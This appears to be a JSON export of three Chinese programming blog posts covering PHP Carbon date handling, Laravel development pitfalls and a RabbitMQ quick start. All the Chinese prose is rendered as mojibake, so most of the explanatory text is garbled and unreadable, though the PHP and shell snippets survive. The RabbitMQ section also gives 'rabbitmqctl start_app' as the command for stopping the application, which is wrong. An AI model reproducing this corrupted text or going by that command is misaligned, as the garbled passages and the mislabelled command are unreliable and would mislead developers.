åˆ¤æ–­ç¬¬ä¸€ä¸ªæ—¥æœŸæ˜¯å¦æ¯”ç¬¬äºŒä¸ªæ—¥æœŸå°ã€‚ gte â€“ åˆ¤æ–­ç¬¬ä¸€ä¸ªæ—¥æœŸæ˜¯å¦å¤§äºç­‰äºç¬¬äºŒä¸ªæ—¥æœŸã€‚ lte â€“ åˆ¤æ–­ç¬¬ä¸€ä¸ªæ—¥æœŸæ˜¯å¦å°äºç­‰äºç¬¬äºŒä¸ªæ—¥æœŸã€‚ 123456$now = Carbon::now();$yesterday = Carbon::yesterday();var_dump($now-&gt;eq($yesterday)); // bool(false)var_dump($now-&gt;gt($yesterday)); // bool(true)var_dump($now-&gt;lt($yesterday)); // bool(false) è¯­ä¹‰åŒ–ç›¸å¯¹æ—¶é—´è¯­ä¹‰åŒ–å˜å¾—è¶Šæ¥è¶Šæµè¡Œï¼Œé€šå¸¸å¯ä»¥åœ¨å„ç§ç¤¾äº¤ã€é€šè®¯åº”ç”¨ä¸Šçœ‹åˆ°ã€‚ ä¾‹å¦‚ï¼Œå°†æ—¶é—´æ˜¾ç¤ºä¸º 3 å°æ—¶å‰ æ¯”æ˜¾ç¤º ä¸Šåˆ 8:12ï¼Œæ›´é€‚åˆäººç±»é˜…è¯»ã€‚ è¿™äº›æ–¹æ³•è¢«ç”¨äºè®¡ç®—æ—¶é—´å·®ï¼Œå¹¶è½¬æ¢ä¸ºäººç±»å¯é˜…è¯»çš„æ ¼å¼ï¼Œæœ‰å¦‚ä¸‹å››ç§è¡¨è¾¾æ—¶é—´å·®çš„æ–¹å¼ï¼š å°†ä¸€ä¸ªè¿‡å»çš„æ—¶é—´å’Œç°åœ¨åšæ¯”è¾ƒï¼š 1 å°æ—¶å‰ 5 ä¸ªæœˆå‰ å°†ä¸€ä¸ªæœªæ¥çš„æ—¶é—´å’Œç°åœ¨åšæ¯”è¾ƒï¼š 1 å°æ—¶å 5 ä¸ªæœˆå å°†ä¸€ä¸ªè¿‡å»çš„æ—¶é—´å’Œå¦ä¸€ä¸ªæ—¶é—´åšæ¯”è¾ƒï¼š 1 å°æ—¶å‰ 5 å°æ—¶å‰ å°†ä¸€ä¸ªæœªæ¥çš„æ—¶é—´å’Œå¦ä¸€ä¸ªåšæ¯”è¾ƒï¼š 1 å°æ—¶å 5 å°æ—¶å 12345$dt = Carbon::now();echo $dt-&gt;subDays(10)-&gt;diffForHumans(); // 1 week agoecho $dt-&gt;addHours(12)-&gt;diffForHumans(); // 1 week agoecho $dt-&gt;subMonth()-&gt;diffForHumans(); // 1 month ago æœ¬åœ°åŒ–ä¸Šé¢æœ€åä¸€ä¸ªä¾‹å­ï¼Œå¯ä»¥çœ‹åˆ°ï¼ŒCarbon é»˜è®¤è¾“å‡ºçš„ä¸æ˜¯ä¸­æ–‡ï¼Œå¯ä»¥å¢åŠ ä»¥ä¸‹ä»£ç è®¾ç½®æœ¬åœ°åŒ–ã€‚ 1234567\\Carbon\\Carbon::setLocale('zh');$dt = Carbon::now();echo $dt-&gt;subDays(10)-&gt;diffForHumans(); // 1å‘¨å‰echo $dt-&gt;addHours(12)-&gt;diffForHumans(); // 1å‘¨å‰echo $dt-&gt;subMonth()-&gt;diffForHumans(); // 1ä¸ªæœˆå‰ Carbon èƒ½åšçš„è¿œè¿œä¸æ­¢è¿™äº›ï¼Œè¿™é‡Œåªæ˜¯åˆ—ä¸¾äº†ä¸€äº›ä¸ªäººå¸¸ç”¨çš„æ–¹æ³•ï¼Œå…³äºæ›´å¤šCarbon çš„ç”¨æ³•ï¼Œè¯·æŸ¥çœ‹å®˜æ–¹æ–‡æ¡£ã€‚ æœ€ä½³å®è·µä¸‹é¢æ•´ç†ä¸€äº›å¸¸è§çš„ä½¿ç”¨åœºæ™¯ã€‚ è·å–æŸä¸ªæ—¶åˆ»çš„èµ·å§‹æ—¶é—´å’Œç»“æŸæ—¶é—´ï¼š 123456789101112131415// è·å–ä¸€å¤©çš„å¼€å§‹æ—¶é—´å’Œç»“æŸæ—¶é—´now()-&gt;startOfDay(); // 2021-08-12 00:00:00now()-&gt;endOfDay(); // 2021-08-12 23:59:59// è·å–è¿™å‘¨çš„å¼€å§‹æ—¶é—´å’Œç»“æŸæ—¶é—´now()-&gt;startOfWeek(); // 2021-08-09 00:00:00now()-&gt;endOfWeek(); // 2021-08-15 23:59:59// è·å–è¿™ä¸ªæœˆçš„èµ·å§‹æ—¶é—´å’Œç»“æŸæ—¶é—´now()-&gt;startOfMonth(); // 2021-08-01 00:00:00now()-&gt;endOfMonth(); // 2021-08-31 23:59:59// è·å–ä»Šå¹´çš„èµ·å§‹æ—¶é—´å’Œç»“æŸæ—¶é—´now()-&gt;startOfYear(); // 2021-01-01 00:00:00now()-&gt;endOfYear(); // 2021-12-31 23:59:59 è·å–æŒ‡å®šæ—¥æœŸèŒƒå›´å†…çš„æ—¥æœŸï¼š 1234$startTime = now();$endTime = Carbon::parse(\"2021-09-12\");$dates = $startTime-&gt;daysUntil($endTime);// è¿”å›ç»“æœåŒ…å«æ¯ä¸€å¤©çš„æ—¥æœŸçš„å¯¹è±¡ æ ¼å¼åŒ–æ—¥æœŸä¸ºæŒ‡å®šæ ¼å¼ï¼š 12now()-&gt;format(\"Y/m/d\"); // 2021/08/12now()-&gt;format(\"Y.m.d\"); // 2021.08.12 åˆ¤æ–­æ—¥æœŸæ˜¯å¦ä¸ºæŒ‡å®šæ ¼å¼ï¼š 1Carbon::hasFormat(\"2021/08/12\", \"Y-m-d\") // false è¯­ä¹‰åŒ–ï¼š 12Carbon::parse(\"2021-08-29 14:57:32\")-&gt;diffForHumans(now());// ä¸€åˆ†é’Ÿå‰ è½¬åŒ–ä¸ºå¤©å°æ—¶åˆ†é’Ÿï¼š 12CarbonInterval::seconds(384)-&gt;cascade()-&gt;forHumans();// 6åˆ†é’Ÿ24ç§’ å‚è€ƒé“¾æ¥ Laravel ä¸­æ—¥æœŸæ—¶é—´ Carbon åŒ…çš„çš„ä½¿ç”¨è¯¦è§£ Carbon Api Doc","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"},{"name":"Laravel","slug":"PHP/Laravel","permalink":"https://www.0x2beace.com/categories/PHP/Laravel/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Laravel","slug":"Laravel","permalink":"https://www.0x2beace.com/tags/Laravel/"}]},{"title":"è®°å½• Laravel å¼€å‘ä¸­ä¸€äº›æœ‰æ„ä¹‰çš„é—®é¢˜","slug":"record-some-meaningful-issues-in-laravel-development","date":"2021-06-28T14:31:56.000Z","updated":"2021-08-29T08:19:47.113Z","comments":true,"path":"record-some-meaningful-issues-in-laravel-development/","link":"","permalink":"https://www.0x2beace.com/record-some-meaningful-issues-in-laravel-development/","excerpt":"å¦‚é¢˜ã€‚","text":"å¦‚é¢˜ã€‚ é—®é¢˜ä¸€ä¸ºä»€ä¹ˆä¸è¦åœ¨ç”Ÿäº§ç¯å¢ƒä½¿ç”¨ composer updateï¼Ÿ å…¶å®è¿™ä¸ªé—®é¢˜å’ŒLaravel å¹¶æ²¡æœ‰ç›´æ¥å…³ç³»ã€‚ æ°¸è¿œä¸è¦åœ¨ç”Ÿäº§ç¯å¢ƒä¸Šç›´æ¥è¿è¡Œ compser updateï¼Œå› ä¸ºå®ƒå¾ˆæ…¢å¹¶ä¸”ä¼šç ´åç‰ˆæœ¬åº“ã€‚ æ­£ç¡®çš„åšæ³•åº”è¯¥æ˜¯ï¼Œå§‹ç»ˆåœ¨æœ¬åœ°å¼€å‘ç¯å¢ƒä¸‹ä½¿ç”¨ composer updateï¼Œå¹¶å°†æ–°çš„composer.lock æäº¤åˆ°ç‰ˆæœ¬åº“ï¼Œç”Ÿäº§ç¯å¢ƒä¸­åˆ™éœ€è¦è¿è¡Œ composer install å³å¯ã€‚ é—®é¢˜äºŒä¸ºä»€ä¹ˆè¿™æ®µä»£ç æ°¸è¿œéƒ½è¿›ä¸åˆ° ã€ç”¨æˆ·æ³¨å†Œå¤±è´¥ã€ä¸­ï¼Ÿ 12345if($user)&#123; return 'ç”¨æˆ·æ³¨å†ŒæˆåŠŸ';&#125;return 'ç”¨æˆ·æ³¨å†Œå¤±è´¥'; å› ä¸ºLaravel çš„å¤§éƒ¨åˆ†æ“ä½œï¼ŒåŸºæœ¬éƒ½æ˜¯ä»¥å¼‚å¸¸å½¢å¼å¤„ç†ï¼Œæ‰€ä»¥ä¸éœ€è¦ if...elseã€‚åŸæ–‡é“¾æ¥ã€‚ é—®é¢˜ä¸‰å…·ä½“å“ªäº›æ“ä½œä¼šè§¦å‘æ¨¡å‹äº‹ä»¶ï¼Ÿ å®ä¾‹ä¸€ï¼š 123456789$user = new User / find / first / all()-&gt;first();// $user not exits; triggering event: creatingã€createdã€savingã€saved// $user exits; triggering event: updatingã€updatedã€savingã€saved$user-&gt;save(); $user-&gt;create();$user-&gt;update();$user-&gt;delete(); è§¦å‘æ¨¡å‹äº‹ä»¶æœ‰ä¸€ä¸ªå¾ˆæ˜¾è‘—çš„ç‰¹å¾å°±æ˜¯ï¼šä¸€å®šä¼šå­˜åœ¨æ¨¡å‹å®ä¾‹ã€‚ å®ä¾‹äºŒï¼š 1User::where('id', 1)-&gt;update(['name', 'eienao']); ä¸Šé¢è¿™ä¸ªä¾‹å­ï¼Œå°±ä¸ä¼šè§¦å‘æ¨¡å‹äº‹ä»¶ï¼Œå› ä¸ºå§‹ç»ˆéƒ½æ²¡æœ‰ä¸€ä¸ªæ¨¡å‹å®ä¾‹å‚ä¸ã€‚ å®ä¾‹ä¸‰ï¼š 12$user = User::first();$user-&gt;where('id', 1)-&gt;update(['name', 'eienao']); è¿™ä¸ªä¾‹å­çœ‹èµ·æ¥å¯èƒ½ä¼šæ¯”è¾ƒè¿·æƒ‘ï¼Œä½†å®é™…ä¸Šæœ€ç»ˆä¹Ÿä¸ä¼šè§¦å‘æ¨¡å‹äº‹ä»¶ï¼Œå› ä¸º where() æ–¹æ³•è¿”å›çš„æ˜¯ä¸€ä¸ªã€æŸ¥è¯¢æ„é€ å™¨ã€ã€‚ æ¨¡å‹å®ä¾‹æ­¤æ—¶å·²ç»ä¸å‚ä¸å…¶ä¸­äº†ï¼Œå…¶åªæ˜¯åšä¸€ä¸ªå¼•å¯¼å‡ºæŸ¥è¯¢æ„é€ å™¨çš„ä½œç”¨ã€‚ é—®é¢˜å››ä¸è¦ç›´æ¥ä» .env æ–‡ä»¶ä¸­è·å–æ•°æ®ã€‚ æ›´å¥½åœ°åšæ³•åº”è¯¥æ˜¯å°†æ•°æ®æ”¾å…¥é…ç½®æ–‡ä»¶ï¼Œç„¶åä½¿ç”¨åŠ©æ‰‹å‡½æ•°config() å»è·å–æ•°æ®ã€‚ åï¼š 1$apiKey = env('API_KEY'); å¥½ï¼š 12345// config/api.php'key' =&gt; env('API_KEY'),// Use the data$apiKey = config('api.key'); ä½ å¯èƒ½ä¼šç–‘æƒ‘ï¼Œä¸ºä»€ä¹ˆè¦è¿™ä¹ˆåšå‘¢ï¼Ÿæœ€åä¸è¿˜æ˜¯è¦ä» .env ä¸­è·å–æ•°æ®ã€‚ è¿™æ˜¯å› ä¸ºå°½é‡ä¸è¦ä¿®æ”¹ä¸šåŠ¡ä»£ç ï¼Œå¦‚é‡å˜åŒ–è¦ä¹ˆä¿®æ”¹configï¼Œè¦ä¹ˆä¿®æ”¹.envï¼Œè€Œconfig çš„ä»£ç æ˜¯çº³å…¥è¯„å®¡çš„ï¼Œä¿®æ”¹èµ·æ¥æ›´æ–¹ä¾¿ï¼Œæ‰€ä»¥åº”è¯¥ç”¨config ä»£ç†.env, èƒ½å‡å°‘å¯¹.env çš„ä¿®æ”¹ã€‚ é—®é¢˜äº”Laravel å¥½åƒè‡ªä»7.x ç‰ˆæœ¬å¼€å§‹ï¼Œä¸ºäº†æ ¼å¼åŒ–æ—¥æœŸä»¥è¿›è¡Œåºåˆ—åŒ–ï¼Œæ¡†æ¶ä½¿ç”¨äº†æ–°çš„æ—¥æœŸåºåˆ—åŒ–æ ¼å¼â€”â€”Carbon çš„ toJSON æ–¹æ³•ã€‚ ä½¿ç”¨æ–°æ ¼å¼åºåˆ—åŒ–çš„æ—¥æœŸå°†æ˜¾ç¤ºä¸ºï¼š2021-07-11 20:01:002019-12-02T20:01:00.283041Zï¼Œçœ¼ç†Ÿä¸ï¼Œè¿™ä¸ªæ ¼å¼ã€‚ å¦‚æœè¿˜æƒ³ä½¿ç”¨æ­£å¸¸çš„å¹´-æœˆ-æ—¥ æ—¶:åˆ†:ç§’ æ ¼å¼ï¼Œåˆ™å¯ä»¥åœ¨æ¨¡å‹ä¸Šè¦†ç›– serializeDate æ–¹æ³•å³å¯ï¼š 123456789101112use DateTimeInterface;/** * Prepare a date for array / JSON serialization. * * @param \\DateTimeInterface $date * @return string */protected function serializeDate(DateTimeInterface $date)&#123; return $date-&gt;format('Y-m-d H:i:s');&#125; é—®é¢˜å…­åœ¨Laravel Model ä¸­ï¼Œå°†æŸä¸ªå±æ€§è®¾ç½®ä¸ºarray castingï¼š 123protected $casts = [ 'options' =&gt; 'array',]; è¿™æ—¶å¦‚æœå†æƒ³å¯¹å…¶å€¼è¿›è¡Œä¿®æ”¹ï¼Œå°±ä¼šå¼•å‘å¼‚å¸¸ï¼š 123$data-&gt;options[\"key\"] = \"value\";// production.ERROR: Indirect modification of overloaded property å¯è§ï¼Œcasting å¹¶ä¸æ”¯æŒä¸€äº›é’ˆå¯¹ç‰¹å®šç±»å‹çš„æ“ä½œï¼Œä¾‹å¦‚æ— æ³•ä½œä¸ºæŒ‡å®šç±»å‹çš„å‡½æ•°çš„å‚æ•°ã€‚ æŒ‰ç…§å®˜æ–¹æ–‡æ¡£çš„åšæ³•ï¼Œåº”è¯¥æ˜¯å…ˆèµ‹å€¼ç»™ä¸€ä¸ªä¸­é—´å˜é‡ï¼Œè¿›è¡Œæ“ä½œï¼Œç„¶åå†èµ‹å€¼å›å»ã€‚ 12345$user = App\\User::find(1);$options = $user-&gt;options;$options['key'] = 'value';$user-&gt;options = $options;$user-&gt;save(); é—®é¢˜ä¸ƒqueue:listen ä¸ queue:work æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ è¿™æ˜¯ä¸€ä¸ªå…³äºé˜Ÿåˆ—çš„é—®é¢˜ï¼Œå‰è€…ä¸åè€…çš„åŒºåˆ«åœ¨äºï¼Œå½“ä¸Šä¸‹æ–‡ç¯å¢ƒå‘ç”Ÿå˜åŒ–ï¼Œå‰è€…ä¼šè‡ªåŠ¨é‡æ–°åŠ è½½æ–°çš„ä¸Šä¸‹æ–‡ï¼Œè€Œåè€…åˆ™ä¸ä¼šã€‚ è‡ªLaravel 5.x ç‰ˆæœ¬ä»¥æ¥ï¼Œå®˜æ–¹æ–‡æ¡£ä¸­å·²ä¸å†ä»‹ç»queue:listen æŒ‡ä»¤æ€ä¹ˆä½¿ç”¨äº†ï¼Œæ‰€ä»¥å¼€å‘é˜¶æ®µå»ºè®®ä½¿ç”¨ queue:listen è¿›è¡Œè°ƒè¯•ï¼Œå…¶ä½™æƒ…å†µå»ºè®®å…¨éƒ¨ä½¿ç”¨ queue:workï¼Œå› ä¸ºæ•ˆç‡æ›´é«˜ã€‚ é—®é¢˜å…«Laravel å¦‚ä½•åœ¨å…³è”æ¨¡å‹ä¸­æ’åºï¼Ÿ ç­”æ¡ˆæ˜¯ï¼šå¯¹äºè·¨è¡¨æ’åºè¿™ç§éœ€æ±‚ï¼Œæ¨¡å‹å…³è”é»˜è®¤æ˜¯æ²¡æœ‰å®ç°çš„ï¼Œå› ä¸ºæ¨¡å‹å…³è”çš„åŸç†æ˜¯å°†SQL æ‹†åˆ†æˆä¸¤æ¡ï¼Œæ¨¡å‹å…³è”çš„ç»“æœé›†æ˜¯åŸºäºå‰é¢ä¸€æ¡SQL è¿”å›çš„id é›†ã€‚ é€šå¸¸æœ‰ä¸¤ç§æ–¹å¼è§£å†³ä»¥ä¸Šéœ€æ±‚ï¼š å†—ä½™å­—æ®µ ä½¿ç”¨ join è¿™é‡Œé¡ºå¸¦ä»‹ç»ä¸€ä¸ª Builder marcoï¼Œä¹Ÿå¯ä»¥è§£å†³ä»¥ä¸Šé—®é¢˜ï¼š 1234567891011121314151617// åŸºäºå…³è”å…³ç³»æ’åºå®ç°Builder::macro('orderByWith', function ($relation, $column, $direction = 'asc'): Builder&#123; /** @var Builder $this */ if (is_string($relation)) &#123; $relation = $this-&gt;getRelationWithoutConstraints($relation); &#125; return $this-&gt;orderBy( $relation-&gt;getRelationExistenceQuery( $relation-&gt;getRelated()-&gt;newQueryWithoutRelationships(), $this, $column ), $direction ); &#125;); è°ƒç”¨æ–¹å¼å¦‚ä¸‹ï¼š 12345// åŸºäºå½“å‰åˆ†ç±»å…³è”$products = Product::has('cates') // æ ¹æ®åˆ†ç±»å…³è”ä¸­çš„sortå­—æ®µè¿›è¡Œæ’åº -&gt;orderByWith('cates', 'sort', 'desc') -&gt;paginate($limit); é—®é¢˜ä¹Observer è¿˜æ˜¯ Listenerï¼Ÿ Observer å¯ä»¥ç›‘å¬ Eloquent æ¨¡å‹çš„ creatingã€createdã€savingã€saved ç­‰äº‹ä»¶ï¼Œè€Œè¿™äº›Listener å…¶å®ä¹Ÿå¯ä»¥åšåˆ°ï¼Œé‚£ä¹ˆå¯¹äºä¸¤è€…è¯¥å¦‚ä½•é€‰æ‹©å‘¢ï¼Ÿ å…¶å®é€šè¿‡è§‚å¯ŸObserverçš„é€»è¾‘å°±ä¼šå‘ç°ï¼Œå®ƒåªæ˜¯åœ¨å¸®åŠ©ä½ æ·»åŠ äº† listen çš„é€»è¾‘ï¼Œå¸®åŠ©ä½ ç®€åŒ–äº†äº‹ä»¶ Listener çš„æ³¨å†Œã€‚ æ‰€ä»¥æˆ‘é€šå¸¸æ˜¯è¿™ä¹ˆé€‰æ‹©çš„ï¼šå¦‚æœå¯¹åº”åœºæ™¯æ˜¯ Eloquent æ¨¡å‹çš„ç›¸å…³äº‹ä»¶ï¼Œåˆ™ä¼šç›´æ¥é€‰æ‹© Observer; å¦‚æœå¯¹åº”åœºæ™¯æ˜¯ä¸šåŠ¡äº‹ä»¶è§¦å‘ï¼Œåˆ™ä¼šé€‰æ‹©Listenerã€‚ å‚è€ƒé“¾æ¥ Laravel attribute casting å¯¼è‡´çš„ Indirect modification of overloaded property Laravel æ€ä¹ˆé€šè¿‡å…³è”å­—æ®µæ’åºï¼Ÿ","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"},{"name":"Laravel","slug":"PHP/Laravel","permalink":"https://www.0x2beace.com/categories/PHP/Laravel/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Laravel","slug":"Laravel","permalink":"https://www.0x2beace.com/tags/Laravel/"}]},{"title":"RabbitMQ å¿«é€Ÿä¸Šæ‰‹","slug":"rabbitmq-quick-start","date":"2021-06-27T10:34:43.000Z","updated":"2021-07-14T15:31:53.598Z","comments":true,"path":"rabbitmq-quick-start/","link":"","permalink":"https://www.0x2beace.com/rabbitmq-quick-start/","excerpt":"RabbitMQ å­¦ä¹ ç¬”è®°æ•´ç†ã€‚","text":"RabbitMQ å­¦ä¹ ç¬”è®°æ•´ç†ã€‚ Rabbit æ˜¯ä»€ä¹ˆï¼Ÿå®ƒæ˜¯ä¸€ä¸ªå¼€æºçš„æ¶ˆæ¯ä»£ç†å’Œé˜Ÿåˆ—æœåŠ¡å™¨ï¼Œç”¨æ¥é€šè¿‡æ™®é€šåè®®åœ¨å®Œå…¨ä¸åŒçš„åº”ç”¨ä¸­å…±äº«æ•°æ®ï¼ŒRabbit æ˜¯ä½¿ç”¨Erlang è¯­è¨€ç¼–å†™çš„ï¼Œè€ŒRabbitMQ æ˜¯åŸºäº AMQP åè®®çš„ã€‚ å¦‚æœä½ è¿˜ä¸çŸ¥é“æ¶ˆæ¯é˜Ÿåˆ—æ˜¯ä»€ä¹ˆï¼Œå¯ä»¥æŸ¥é˜…æˆ‘çš„è¿™ç¯‡ç¬”è®°â€”â€”å¿«é€Ÿä¸Šæ‰‹æ¶ˆæ¯é˜Ÿåˆ— æˆç†Ÿçš„æ¶ˆæ¯é˜Ÿåˆ—é‚£ä¹ˆå¤šï¼Œä¸ºä»€ä¹ˆè¦é€‰æ‹©RabbitMQï¼Ÿå·¥å…·çš„é€‰æ‹©å¾€å¾€å¹¶ä¸ç›´æ¥å–å†³äºè¯¥å·¥å…·æœ¬èº«å¤šä¹ˆä¼˜ç§€ï¼Œè€Œæ˜¯è¯¥å·¥å…·èƒ½æä¾›çš„åŠŸèƒ½ï¼Œåˆšæ‰ç¬¦åˆæˆ‘ä»¬çš„éœ€æ±‚ã€‚ RabbitMQ ä¹Ÿæ˜¯ï¼Œåœ¨ä¼—å¤šæˆç†Ÿçš„æ¶ˆæ¯é˜Ÿåˆ—ä¸­ï¼Œå®ƒçš„ç‰¹ç‚¹å¦‚ä¸‹ï¼š å¼€æºã€æ€§èƒ½ä¼˜ç§€ æä¾›å¯é æ€§æ¶ˆæ¯æŠ•é€’æ¨¡å¼ã€è¿”å›æ¨¡å¼ é›†ç¾¤æ¨¡å¼ä¸°å¯Œï¼Œæ”¯æŒè¡¨è¾¾å¼é…ç½®ï¼ŒHA æ¨¡å¼ï¼Œæ”¯æŒé•œåƒé˜Ÿåˆ—æ¨¡å‹ ä¿è¯æ•°æ®ä¸ä¸¢å¤±çš„å‰æä¸‹åšåˆ°é«˜å¯é æ€§ã€å¯ç”¨æ€§ ä»€ä¹ˆæ˜¯AMQP é«˜çº§åè®®ï¼ŸAMQP å…¨ç§°ï¼ˆAdvanced Message Queuing Protocolï¼‰é«˜çº§æ¶ˆæ¯é˜Ÿåˆ—åè®®ã€‚ å®ƒæ˜¯ä¸€ä¸ªå…·æœ‰ç°ä»£ç‰¹å¾çš„äºŒè¿›åˆ¶åè®®ï¼Œæ˜¯ä¸€ä¸ªæä¾›ç»Ÿä¸€æ¶ˆæ¯æœåŠ¡çš„åº”ç”¨å±‚æ ‡å‡†é«˜çº§æ¶ˆæ¯é˜Ÿåˆ—åè®®ï¼Œæ˜¯åº”ç”¨å±‚åè®®çš„ä¸€ä¸ªå¼€æ”¾æ ‡å‡†ï¼Œä¸ºé¢å‘ä¿¡æ¯çš„ä¸­é—´ä»¶è®¾è®¡ã€‚ è¿™ä¸ªè§£é‡Šå¤ªå®˜æ–¹äº†ï¼Œè¯´äº†è·Ÿæ²¡è¯´ä¼¼çš„ã€‚ å…¶å®å‘¢ï¼Œé€šä¿—ä¸€ç‚¹è®²ï¼Œå®ƒå°±æ˜¯ä¸€ä¸ªè§„èŒƒï¼Œçº¦å®šäº†ä¸€ä¸ªæ ¸å¿ƒæ¦‚å¿µï¼Œå¼€å‘æ—¶éœ€è¦éµå®ˆè¯¥è§„èŒƒã€‚ AMQP æ ¸å¿ƒæ¦‚å¿µAMQP æ ¸å¿ƒæ¦‚å¿µç”±ä»¥ä¸‹éƒ¨åˆ†ç»„æˆï¼š Serverï¼šåˆç§° Brokerï¼Œæ¥å—å®¢æˆ·ç«¯è¿æ¥ï¼Œå®ç°AMQP å®ä½“æœåŠ¡ Connectionï¼šè¿æ¥ï¼Œåº”ç”¨ç¨‹åºä¸Broker çš„ç½‘ç»œè¿æ¥ Channelï¼šç½‘ç»œä¿¡é“ï¼Œå‡ ä¹æ‰€æœ‰çš„æ“ä½œéƒ½åœ¨Channel ä¸­è¿›è¡Œï¼ŒChannel æ˜¯è¿›è¡Œæ¶ˆæ¯è¯»å†™çš„é€šé“ï¼Œå®¢æˆ·ç«¯å¯å»ºç«‹å¤šä¸ªChannelï¼Œæ¯ä¸ªChannel ä»£è¡¨ä¸€ä¸ªä¼šè¯ä»»åŠ¡ã€‚ Messageï¼šæ¶ˆæ¯ï¼ŒæœåŠ¡å™¨ä¸åº”ç”¨ç¨‹åºä¹‹é—´ä¼ é€çš„æ¶ˆæ¯ï¼Œç”±Properties å’ŒBody ç»„æˆï¼ŒProperties å¯ä»¥å¯¹æ¶ˆæ¯è¿›è¡Œä¿®é¥°ï¼Œæ¯”å¦‚æ¶ˆæ¯çš„ä¼˜å…ˆçº§ã€å»¶è¿Ÿç­‰é«˜çº§ç‰¹æ€§; Body å°±æ˜¯æ¶ˆæ¯ä½“å†…å®¹ã€‚ Virtual hostï¼šè™šæ‹Ÿä¸»æœºï¼Œç”¨äºè¿›è¡Œé€»è¾‘éš”ç¦»ï¼Œæœ€ä¸Šå±‚çš„æ¶ˆæ¯è·¯ç”±ï¼Œä¸€ä¸ªVirtual host é‡Œé¢å¯ä»¥æœ‰è‹¥å¹²ä¸ª Exchange å’ŒQueueï¼ŒåŒä¸€ä¸ªVirtual host é‡Œé¢ä¸èƒ½æœ‰ç›¸åŒåç§°çš„Exchange å’Œ Queue ã€‚ Exchangeï¼šäº¤æ¢æœºï¼Œæ¥æ”¶æ¶ˆæ¯ï¼Œæ ¹æ®è·¯ç”±é”®è½¬å‘æ¶ˆæ¯åˆ°ç»‘å®šçš„é˜Ÿåˆ— Bindingï¼šExchange å’ŒQueue ä¹‹é—´çš„è™šæ‹Ÿè¿æ¥ï¼Œbinding ä¸­å¯ä»¥åŒ…å« routing key Routing keyï¼šä¸€ä¸ªè·¯ç”±è§„åˆ™ï¼Œè™šæ‹Ÿæœºå¯ä»¥ç”¨ä»–æ¥ç¡®å®šå¦‚ä½•è·¯ç”±ä¸€ä¸ªç‰¹å®šæ¶ˆæ¯ Queueï¼šä¹Ÿç§°ä¸ºMessage Queueï¼Œæ¶ˆæ¯é˜Ÿåˆ—ï¼Œä¿å­˜æ¶ˆæ¯å¹¶å°†å®ƒä»¬è½¬å‘ç»™æ¶ˆè´¹è€… RabbitMQ æ•´ä½“æ¶æ„RabbitMQ æ•´ä½“æ¶æ„ï¼Œå¯ä»¥æŠ½è±¡çœ‹æˆä¸‰éƒ¨åˆ†ç»„æˆï¼š Produceï¼šæ¶ˆæ¯ç”Ÿäº§è€… Serviceï¼šAMQP æœåŠ¡ Consumeï¼šæ¶ˆæ¯æ¶ˆè´¹è€… ä¸€ä¸ªç®€å•çš„RabbitMQ æ¶æ„å›¾ï¼š åœ¨ä¸Šå›¾ä¸­ï¼Œç”Ÿäº§è€…é¦–å…ˆæŠŠæ¶ˆæ¯æŠ•é€’åˆ°Server çš„Exchange ä¸­ï¼Œç„¶åExchange å°†æ¶ˆæ¯æµè½¬åˆ°æŸä¸ªQueue ä¸­ï¼Œç”Ÿäº§è€…ç›‘å¬æŒ‡å®šé˜Ÿåˆ—ä»ä¸­è·å–æ¶ˆæ¯ã€‚ åœ¨è¯¥æµç¨‹ä¸­ï¼Œç”Ÿäº§è€…ä¸éœ€è¦å…³å¿ƒï¼Œå°†æ¶ˆæ¯æŠ•é€’åˆ°å“ªä¸ªé˜Ÿåˆ—ï¼Œåªéœ€è¦å…³å¿ƒï¼Œå°†æ¶ˆæ¯æŠ•é€’åˆ°å“ªä¸ªExchangeã€‚æ¶ˆè´¹è€…ä¹Ÿä¸éœ€è¦å…³å¿ƒï¼Œæ¶ˆæ¯æ˜¯ä»å“ªä¸ªExchange ä¸­è·å–çš„ï¼Œåªéœ€è¦å…³å¿ƒï¼Œç›‘å¬å“ªä¸ªé˜Ÿåˆ—ã€‚ é‚£ä¹ˆExchange ä¸Queue ä¹‹é—´åˆæ˜¯å¦‚ä½•è¿›è¡Œæ¶ˆæ¯æµè½¬çš„å‘¢ï¼Ÿ è™½ç„¶ä¸€ä¸ªExchange å¯ä»¥ç»‘å®šå¤šä¸ªQueueï¼Œä½†æ˜¯è·¯ç”±ç­–ç•¥ï¼ˆRouting Keyï¼‰å†³å®šäº†ï¼Œæœ€ç»ˆå°†æ¶ˆæ¯æŠ•é€’åˆ°å“ªä¸ªå…·ä½“Queueä¸Šã€‚ RabbitMQ å¿«é€Ÿä¸Šæ‰‹å’Œå…¶ä»–æ¶ˆæ¯é˜Ÿåˆ—ä¸€æ ·ï¼Œæƒ³è¦ä½¿ç”¨ï¼Œéœ€è¦å…ˆå®‰è£…é˜Ÿåˆ—æœåŠ¡å™¨å¹¶å¯ç”¨ã€‚ å…·ä½“å®‰è£…è¿‡ç¨‹å°±ä¸è¿‡å¤šä»‹ç»ï¼Œå¯ä»¥å‰å¾€å®˜ç½‘æŸ¥çœ‹å¯¹åº”æ“ä½œç³»ç»Ÿçš„å®‰è£…æµç¨‹ã€‚ å®‰è£…å®Œæˆä¹‹åï¼Œé€šè¿‡rabbitmq-server start_app å‘½ä»¤ï¼Œå¯åŠ¨RabbitMQ æœåŠ¡ã€‚ å¦‚æœèƒ½çœ‹åˆ°ä»¥ä¸Šè¾“å‡ºï¼Œåˆ™è¡¨ç¤ºæœåŠ¡å·²æ­£å¸¸å¯åŠ¨ã€‚ å¸¸è§æ¦‚å¿µ 5672ï¼šé€šä¿¡ç«¯å£å· 15672ï¼šç®¡æ§å°ç«¯å£å· 25672ï¼šé›†ç¾¤ç«¯å£å· rabbitmqctlï¼šåŸºç¡€æœåŠ¡ç®¡ç† rabbitmq-pluginsï¼šæ’ä»¶ç®¡ç† rabbitmq-server è®¿é—® 127.0.0.1:15672 å³å¯çœ‹åˆ°RabbitMQ çš„æ§åˆ¶å°ï¼Œé»˜è®¤çš„è´¦å·å¯†ç åˆ†åˆ«ä¸ºï¼šguestã€guestã€‚ å¸¸ç”¨å‘½ä»¤æœåŠ¡å™¨ç®¡ç†å¯åŠ¨åº”ç”¨ï¼š 1rabbitmqctl start_app å…³é—­åº”ç”¨ï¼š 1rabbitmqctl start_app 